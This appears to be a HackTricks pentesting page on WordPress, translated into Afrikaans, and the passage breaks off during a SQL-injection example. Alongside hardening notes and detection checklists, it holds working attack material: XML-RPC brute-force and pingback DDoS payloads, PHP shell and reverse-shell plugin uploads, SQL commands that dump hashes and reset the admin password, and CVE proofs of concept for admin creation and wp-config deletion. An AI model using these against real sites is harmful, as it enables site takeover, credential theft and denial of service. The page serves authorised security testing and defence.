# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

- **Opgelaaide** lêers gaan na: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Temalêers kan gevind word in /wp-content/themes/,** dus as jy 'n paar php van die tema verander om RCE te kry, sal jy waarskynlik daardie pad gebruik. Byvoorbeeld: As jy **tema twentytwelve** gebruik kan jy die **404.php** lêer bereik in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Nog 'n nuttige url kan wees:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** kan jy die root wagwoord van die databasis vind.
- Standaard login-paaie om na te kyk: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Hoof WordPress-lêers**

- `index.php`
- `license.txt` bevat nuttige inligting soos die geïnstalleerde WordPress-weergawe.
- `wp-activate.php` word gebruik vir die e-pos-aktiveringsproses wanneer 'n nuwe WordPress-webwerf opgestel word.
- Login-vouers (kan hernoem word om dit te verberg):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is 'n lêer wat 'n funksie van WordPress verteenwoordig wat toelaat dat data oorgedra word met HTTP as die vervoermeganisme en XML as die enkoderingsmeganisme. Hierdie tipe kommunikasie is vervang deur die WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Die `wp-content` vouer is die hoofgids waar plugins en temas gestoor word.
- `wp-content/uploads/` is die gids waar enige lêers opgelaai na die platform gestoor word.
- `wp-includes/` Hierdie is die gids waar kernlêers gestoor word, soos sertifikate, fonte, JavaScript-lêers, en widgets.
- `wp-sitemap.xml` In WordPress weergawes 5.5 en hoër, genereer WordPress 'n sitemap XML-lêer met alle publieke plasings en publiek navraagbare plasingsoorte en taksonomieë.

**Post exploitation**

- Die `wp-config.php` lêer bevat inligting wat deur WordPress benodig word om aan die databasis te koppel, soos die databasisnaam, databasis-host, gebruikersnaam en wagwoord, verifikasiesleutels en salts, en die databasis tabelvoorvoegsel. Hierdie konfigurasielêer kan ook gebruik word om DEBUG-modus te aktiveer, wat nuttig kan wees tydens foutopsporing.

### Gebruikerstoestemmings

- **Administrator**
- **Editor**: Publiseer en bestuur sy eie en ander se plasings
- **Author**: Publiseer en bestuur sy eie plasings
- **Contributor**: Skryf en bestuur sy plasings maar kan dit nie publiseer nie
- **Subscriber**: Blaai deur plasings en wysig hul profiel

## **Passiewe Enumerasie**

### **Kry WordPress-weergawe**

Kyk of jy die lêers `/license.txt` of `/readme.html` kan vind

Binne die **bronkode** van die bladsy (voorbeeld van [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link-lêers

![](<../../images/image (533).png>)

- JavaScript-lêers

![](<../../images/image (524).png>)

### Kry inproppe
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Kry temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Trek weergawes in die algemeen uit
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktiewe opsporing

### Plugins and Themes

Jy sal waarskynlik nie alle Plugins en Themes kan vind wat moontlik is nie. Om hulle almal te ontdek, sal jy **aktief Brute Force 'n lys van Plugins en Themes** moet uitvoer (hopelik is daar geoutomatiseerde gereedskap wat hierdie lyste bevat).

### Gebruikers

- **ID Brute:** Jy kry geldige gebruikers van 'n WordPress-site deur gebruikers-ID's te Brute Force:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
As die antwoorde **200** of **30X** is, beteken dit dat die id **geldig** is. As die antwoord **400** is, dan is die id **ongeldig**.

- **wp-json:** Jy kan ook probeer om inligting oor die gebruikers te kry deur 'n navraag te stuur:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Nog 'n `/wp-json/` endpoint wat sekere inligting oor gebruikers kan onthul, is:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Let wel dat hierdie endpoint slegs gebruikers blootstel wat 'n pos gemaak het. **Slegs inligting oor die gebruikers wat hierdie funksie geaktiveer het sal verskaf word**.

Hou ook in gedagte dat **/wp-json/wp/v2/pages** IP addresses kan leak.

- **Login username enumeration**: Wanneer jy by **`/wp-login.php`** aanmeld, is die **boodskap** **anders**, wat aandui of die **gebruikersnaam bestaan of nie**.

### XML-RPC

As `xml-rpc.php` aktief is, kan jy 'n credentials brute-force uitvoer of dit gebruik om DoS-aanvalle op ander hulpbronne te loods. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Om te sien of dit aktief is, probeer toegang verkry tot _**/xmlrpc.php**_ en stuur hierdie versoek:

**Kontroleer**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** of **`metaWeblog.getUsersBlogs`** is 'n paar van die metodes wat gebruik kan word om credentials te brute-force. As jy enige van hulle kan vind, kan jy iets soos die volgende stuur:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die boodskap _"Verkeerde gebruikersnaam of wagwoord"_ binne 'n 200-kode reaksie moet verskyn as die inlogbesonderhede nie geldig is nie.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Met die korrekte inlogbesonderhede kan jy 'n lêer oplaai. In die reaksie sal die pad verskyn ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Daar is ook 'n **vinnigere manier** om credentials te brute-force deur **`system.multicall`** te gebruik, aangesien jy verskeie credentials in dieselfde versoek kan probeer:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Hierdie metode is bedoel vir programme en nie vir mense nie, en is oud, daarom ondersteun dit nie 2FA nie. Dus, as jy geldige creds het maar die hooftoegang is beskerm deur 2FA, **mag jy xmlrpc.php kan misbruik om met daardie creds aan te meld en 2FA te omseil**. Let wel dat jy nie al die aksies wat jy deur die console kan uitvoer, sal kan doen nie, maar jy kan steeds by RCE uitkom soos Ippsec dit verduidelik in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

As jy die metode _**pingback.ping**_ in die lys kan vind, kan jy Wordpress 'n ewekansige versoek na enige host/port laat stuur.\
Dit kan gebruik word om **duisende** Wordpress **sites** te vra om een **lokasie** te **access** (sodat 'n **DDoS** by daardie lokasie veroorsaak word) of jy kan dit gebruik om **Wordpress** 'n interne **network** te **scan** te laat uitvoer (jy kan enige poort aandui).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

As jy **faultCode** kry met 'n waarde **groter** as **0** (17), beteken dit die port is oop.

Kyk na die gebruik van **`system.multicall`** in die vorige afdeling om te leer hoe om hierdie metode te misbruik om DDoS te veroorsaak.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Hierdie lêer bestaan gewoonlik onder die root van die Wordpress-webwerf: **`/wp-cron.php`**\
Wanneer hierdie lêer **accessed** word, word 'n "**heavy**" MySQL **query** uitgevoer, so dit kan deur **attackers** gebruik word om 'n **DoS** te **cause**.\
Standaard word die `wp-cron.php` op elke page load aangeroep (elke keer as 'n kliënt enige Wordpress-blad versoek), wat op hoë-traffic webwerwe probleme (DoS) kan veroorsaak.

Dit word aanbeveel om Wp-Cron te disable en 'n werklike cronjob op die host te skep wat die nodige aksies op gereelde intervalle uitvoer (sonder om probleme te veroorsaak).

### /wp-json/oembed/1.0/proxy - SSRF

Probeer om _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ te access en die Wordpress-site mag 'n versoek na jou maak.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Hierdie tool kontroleer of die **methodName: pingback.ping** bestaan en of die pad **/wp-json/oembed/1.0/proxy** beskikbaar is; as dit bestaan, probeer dit om dit uit te exploit.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Verkry toegang deur 'n bit oor te skryf

Dit is meer 'n nuuskierigheid as 'n werklike aanval. In die CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) kon jy 1 bit van enige wordpress-lêer omdraai. Sodoende kon jy die posisie `5389` van die lêer `/var/www/html/wp-includes/user.php` omdraai om die NOT (`!`) operasie te NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Paneel RCE**

**Wysig 'n php uit die gebruikte theme (admin credentials benodig)**

Appearance → Theme Editor → 404 Template (aan die regterkant)

Verander die inhoud na 'n php shell:

![](<../../images/image (384).png>)

Soek op die internet hoe jy daardie opgedateerde bladsy kan bereik. In hierdie geval moet jy hier toegang kry: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Jy kan gebruik:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
om 'n sessie te kry.

## Plugin RCE

### PHP plugin

Dit mag moontlik wees om .php-lêers as 'n plugin op te laai.\
Skep jou php-backdoor byvoorbeeld met:

![](<../../images/image (183).png>)

Voeg dan 'n nuwe plugin by:

![](<../../images/image (722).png>)

Laai die plugin op en druk Install Now:

![](<../../images/image (249).png>)

Klik op Procced:

![](<../../images/image (70).png>)

Waarskynlik sal dit blykbaar niks doen nie, maar as jy na Media gaan, sal jy jou shell opgelaai sien:

![](<../../images/image (462).png>)

Gaan na dit en jy sal die URL sien om die reverse shell uit te voer:

![](<../../images/image (1006).png>)

### Oplaai en aktiveer kwaadwillige plugin

Hierdie metode behels die installasie van 'n kwaadwillige plugin wat bekend is as kwesbaar en wat uitgebuit kan word om 'n web shell te verkry. Hierdie proses word deur die WordPress dashboard soos volg uitgevoer:

1. **Plugin Verkryging**: Die plugin word verkry van 'n bron soos Exploit DB, byvoorbeeld [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installasie**:
- Gaan na die WordPress dashboard, en navigeer dan na `Dashboard > Plugins > Upload Plugin`.
- Laai die zip-lêer van die afgelaaide plugin op.
3. **Plugin Aktivering**: Sodra die plugin suksesvol geïnstalleer is, moet dit deur die dashboard geaktiveer word.
4. **Eksploitasie**:
- Met die plugin "reflex-gallery" geïnstalleer en geaktiveer, kan dit uitgebuit word aangesien dit bekend is as kwesbaar.
- Die Metasploit framework bied 'n exploit vir hierdie kwesbaarheid. Deur die toepaslike module te laai en spesifieke opdragte uit te voer, kan 'n meterpreter-sessie gevestig word wat onbevoegde toegang tot die site gee.
- Daar word opgemerk dat dit net een van die baie metodes is om 'n WordPress-site uit te buit.

Die inhoud sluit visuele hulpmiddels in wat die stappe in die WordPress-dashboard uitbeeld vir die installering en aktivering van die plugin. Dit is egter belangrik om daarop te let dat die uitbuiting van kwesbaarhede op hierdie wyse onwettig en oneties is sonder behoorlike toestemming. Hierdie inligting moet verantwoordelik en slegs in 'n wettige konteks gebruik word, soos penetration testing met uitdruklike toestemming.

**Vir meer gedetailleerde stappe sien:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Van XSS na RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is 'n script ontwerp om 'n **Cross-Site Scripting (XSS)** kwesbaarheid te eskaleer na **Remote Code Execution (RCE)** of ander kritieke kwesbaarhede in WordPress. Vir meer inligting sien [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Dit bied **ondersteuning vir Wordpress-weergawe 6.X.X, 5.X.X en 4.X.X en laat toe om:**
- _**Privilege Escalation:**_ Skep 'n gebruiker in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Laai jou eie custom plugin (backdoor) na WordPress op.
- _**(RCE) Built-In Plugin Edit:**_ Wysig 'n ingeboude plugin in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Wysig 'n ingeboude tema in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits vir derdeparty WordPress-plugins/-temas.

## Post Exploitation

Onttrek gebruikersname en wagwoorde:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Verander admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Aanvalsoppervlak

Om te weet hoe 'n Wordpress plugin funksionaliteit kan blootstel is noodsaaklik om kwesbaarhede daarin te vind. Jy kan vind hoe 'n plugin funksionaliteit kan blootstel in die volgende punte en 'n paar voorbeelde van kwesbare plugins in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Een van die maniere waarop 'n plugin funksies aan gebruikers kan blootstel, is via AJAX handlers. Hierdie kan logika-, authorization- of authentication-bugs bevat. Verder is dit dikwels dat hierdie funksies beide die authentication en authorization gaan baseer op die bestaan van 'n Wordpress nonce wat **enige gebruiker wat in die Wordpress-instansie geauthentiseer is mag hê** (onafhanklik van sy rol).

Dit is die funksies wat gebruik kan word om 'n funksie in 'n plugin bloot te stel:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die gebruik van `nopriv` maak die eindpunt toeganklik vir enige gebruikers (selfs ongeauthentiseerde gebruikers).**

> [!CAUTION]
> Verder, as die funksie net die outorisering van die gebruiker kontroleer met die funksie `wp_verify_nonce`, hierdie funksie kontroleer net dat die gebruiker aangemeld is; dit kontroleer gewoonlik nie die rol van die gebruiker nie. Dus kan gebruikers met lae voorregte toegang hê tot aksies met hoë voorregte.

- **REST API**

Dit is ook moontlik om funksies van WordPress bloot te stel deur 'n REST API te registreer met die funksie `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Die `permission_callback` is 'n callback-funksie wat kontroleer of 'n gegewe gebruiker gemagtig is om die API-metode aan te roep.

**As die ingeboude `__return_true` funksie gebruik word, sal dit eenvoudig die gebruikerstoestemmingskontrole oorslaan.**

- **Direkte toegang tot die php-lêer**

Natuurlik gebruik Wordpress PHP en lêers binne plugins is direk vanaf die web toeganklik. Dus, in die geval dat 'n plugin enige kwesbare funksionaliteit blootstel wat net deur toegang tot die lêer geaktiveer word, sal dit deur enige gebruiker uitgebuit kan word.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Sommige plugins implementeer "trusted header" kortpaaie vir interne integrasies of reverse proxies en gebruik daardie header om die huidige gebruikerskonteks vir REST-versoeke te stel. As die header nie kriptografies aan die versoek gebind is deur 'n upstream-komponent nie, kan 'n aanvaller dit spoof en geprivilegieerde REST-roetes as administrator tref.

- Impact: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (dwing user ID 1 af, tipies die eerste administrator-rekening).
- Geëksploiteerde roete: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Hoekom dit werk

- Die plugin koppel 'n kliënt-beheerde header aan die outentikasie‑status en slaan capability checks oor.
- WordPress‑kern verwag die `create_users` capability vir hierdie route; die plugin‑hack omseil dit deur die huidige gebruiker‑konteks direk vanaf die header te stel.

Verwagte sukses-aanwysers

- HTTP 201 met 'n JSON-lichaam wat die geskepte gebruiker beskryf.
- 'n Nuwe admin‑gebruiker sigbaar in `wp-admin/users.php`.

Opsporingskontrolelys

- Grep na `getallheaders()`, `$_SERVER['HTTP_...']`, of vendor SDKs wat custom headers lees om gebruiker‑konteks te stel (bv. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Hersien REST‑registrasies vir bevoorregte callbacks wat nie sterk `permission_callback` kontroles het nie en in plaas daarvan op versoek‑headers staatmaak.
- Kyk vir gebruike van kern gebruikers‑bestuursfunksies (`wp_insert_user`, `wp_create_user`) binne REST‑handlers wat slegs deur header‑waardes gegrens is.

Verharding

- Moet nooit outentikasie of autorisasie aflei van kliënt‑beheerde headers nie.
- Indien 'n reverse proxy identiteit moet inspuit, beëindig vertroue by die proxy en verwyder inkomende kopieë (bv. `unset X-Wcpay-Platform-Checkout-User` by die edge), en stuur dan 'n ondertekende token en verifieer dit server‑kant.
- Vir REST‑routes wat bevoorregte aksies uitvoer, vereis `current_user_can()` kontroles en 'n streng `permission_callback` (MOET NIE `__return_true` gebruik nie).
- Gee voorkeur aan first‑party auth (cookies, application passwords, OAuth) bo header “impersonation”.

References: see the links at the end of this page for a public case and broader analysis.

### Nie-geauthentiseerde arbitrêre lêerverwydering via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes en plugins stel dikwels AJAX‑handlers bloot via die `wp_ajax_` en `wp_ajax_nopriv_` hooks. Wanneer die **_nopriv_** variant gebruik word **word die callback vir nie-geauthentiseerde besoekers bereikbaar**, dus moet enige sensitiewe aksie addisioneel die volgende implementeer:

1. 'n **capability check** (bv. `current_user_can()` of minstens `is_user_logged_in()`), en
2. 'n **CSRF nonce** gevalideer met `check_ajax_referer()` / `wp_verify_nonce()`, en
3. **Streng inset‑sanitisering / validasie**.

Die Litho multipurpose theme (< 3.1) het daardie drie kontroles in die *Remove Font Family* funksie vergeet en het uiteindelik die volgende kode saamgestuur (vereenvoudig):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Ongeauthentiseerde toegang** – die `wp_ajax_nopriv_` hook is geregistreer.
* **Geen nonce / capability check** – enige besoeker kan die endpoint tref.
* **Geen pad-sanitisasie** – die deur gebruiker beheerde `fontfamily` string word sonder filtrering by 'n lêerstelsel-pad gevoeg, wat klassieke `../../` traversal moontlik maak.

#### Uitbuiting

'n aanvaller kan enige lêer of gids **onder die uploads base directory** (normaalweg `<wp-root>/wp-content/uploads/`) verwyder deur 'n enkele HTTP POST versoek te stuur:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Aangesien `wp-config.php` buite *uploads* geleë is, is vier `../`-reekse genoeg op 'n standaardinstallasie. Om `wp-config.php` te verwyder dwing WordPress by die volgende besoek in die *installasie-assistent*, en stel 'n volledige webwerf-oorname in staat (die aanvaller voorsien net 'n nuwe DB-konfigurasie en skep 'n admin-gebruiker).

Ander impakvolle teikens sluit in plugin/theme `.php` lêers (om security plugins te breek) of `.htaccess` reëls.

#### Opsporingskontrolelys

* Enige `add_action( 'wp_ajax_nopriv_...')` callback wat filesystem helpers aanroep (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Samevoeging van ongesuiwerde gebruikersinvoer in paaie (soek na `$_POST`, `$_GET`, `$_REQUEST`).
* Afwesigheid van `check_ajax_referer()` en `current_user_can()`/`is_user_logged_in()`.

#### Verharding
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Altyd** behandel enige skryf/verwyder-aksie op skyf as geprivilegieerd en kontroleer dit dubbel:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via verouderde rolherstel en ontbrekende authorization (ASE "View Admin as Role")

Baie plugins implementeer 'n "view as role" of tydelike rol-wissel funksie deur die oorspronklike rol(le) in user meta te stoor sodat dit later herstel kan word. As die herstelpad slegs op request parameters staatmaak (bv. `$_REQUEST['reset-for']`) en 'n plugin-onderhoude lys sonder om capabilities en 'n geldige nonce na te gaan, word dit 'n vertical privilege escalation.

'n Werklike voorbeeld is gevind in die Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). Die reset-vertakking het rolle herstel gebaseer op `reset-for=<username>` indien die gebruikersnaam in 'n interne array `$options['viewing_admin_as_role_are']` verskyn het, maar het nie 'n `current_user_can()`-kontrole uitgevoer nie en ook nie 'n nonce-verifikasie gedoen voordat dit die huidige rolle verwyder en die gestoor rolle uit die user meta `_asenha_view_admin_as_original_roles` weer bygevoeg het nie:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Waarom dit uitbuitbaar is

- Vertrou op `$_REQUEST['reset-for']` en 'n plugin-opsie sonder server-side magtiging.
- As 'n gebruiker vroeër hoër voorregte in `_asenha_view_admin_as_original_roles` gestoor gehad het en gedegradeer is, kan hulle dit herstel deur die reset path te tref.
- In sommige implementasies kan enige authenticated user 'n reset vir 'n ander gebruikersnaam uitlok wat nog in `viewing_admin_as_role_are` teenwoordig is (broken authorization).

Vereistes vir aanval

- Kwetsbare plugin-weergawe met die kenmerk aangeskakel.
- Teikenrekening het 'n verouderde hoë-privilegie-rol in user meta gestoor vanaf vroeër gebruik.
- Any authenticated session; nonce/capability ontbreek op die reset flow.

Uitbuiting (voorbeeld)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Op kwesbare builds verwyder dit die huidige rolle en voeg die gestoorde “originele rolle” weer by (bv. `administrator`), wat effektief privileges eskaleer.

Detection checklist

- Kyk na rol-wissel funksies wat “originele rolle” in user meta bewaar (bv. `_asenha_view_admin_as_original_roles`).
- Identifiseer reset/restore-paaie wat:
- Lees gebruikersname uit `$_REQUEST` / `$_GET` / `$_POST`.
- Wysig rolle via `add_role()` / `remove_role()` sonder `current_user_can()` en `wp_verify_nonce()` / `check_admin_referer()`.
- Authoriseer gebaseer op 'n plugin opsie-array (bv. `viewing_admin_as_role_are`) in plaas van die actor’s capabilities.

Hardening

- Dwing capability checks af op elke state-changing branch (bv. `current_user_can('manage_options')` of strenger).
- Vereis nonces vir alle rol/permission mutasies en verifieer hulle: `check_admin_referer()` / `wp_verify_nonce()`.
- Vertrou nooit request-verskafte gebruikersname nie; los die teikengebruiker server-side op gebaseer op die geauthentiseerde actor en 'n eksplisiete beleid.
- Ongeldig maak die “originele rolle” staat by profiel-/rol-opdaterings om verouderde hoë-privilege herstel te voorkom:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Oorweeg om minimale toestand te stoor en tydelik-beperkte, vermoë-beskermde tokens vir tydelike rolwissels te gebruik.

---

### WAF-oorwegings vir WordPress/plugin CVEs

Generiese edge/server WAFs is op breë patrone (SQLi, XSS, LFI) ingestel. Baie hoë-impak WordPress/plugin-foute is toepassings-spesifieke logika/auth-bugs wat soos onskadelike verkeer lyk tensy die engine WordPress-roetes en plugin-semantiek verstaan.

Offensiewe notas

- Teiken plugin-spesifieke endpoints met skoon payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Oefen eers unauth-paaie (AJAX `nopriv`, REST met permissiewe `permission_callback`, openbare shortcodes). Standaard payloads slaag dikwels sonder obfuskasie.
- Tipiese hoë-impakgevalle: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Verdedigingsnotas

- Moet nie op generiese WAF-signature staatmaak om plugin CVEs te beskerm nie. Voer toepassing-laag, kwesbaarheid-spesifieke virtuele pleisters in of werk vinnig by.
- Gee voorkeur aan positiewe sekuriteitskontroles in die kode (capabilities, nonces, strikte invoervalidasie) bo negatiewe regex-filters.

## WordPress-beskerming

### Gereelde opdaterings

Maak seker WordPress, plugins, en temas is op datum. Bevestig ook dat outomatiese opdatering in wp-config.php aangeskakel is:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ook, **installeer slegs betroubare WordPress plugins en themes**.

### Sekuriteits-plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ander aanbevelings**

- Verwyder die standaard **admin** gebruiker
- Gebruik **sterk wagwoorde** en **2FA**
- Gaan gebruikers se **toestemmings** periodiek na
- **Beperk aanmeldpogings** om Brute Force-aanvalle te voorkom
- Hernoem die **`wp-admin.php`** lêer en laat slegs interne toegang of toegang vanaf sekere IP-adresse toe.

### Ongemagtigde SQL Injection via onvoldoende validering (WP Job Portal <= 2.3.2)

Die WP Job Portal recruitment plugin het 'n **savecategory** taak blootgestel wat uiteindelik die volgende kwesbare kode binne `modules/category/model.php::validateFormData()` uitvoer:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probleme wat deur hierdie kodefragment ingevoer is:

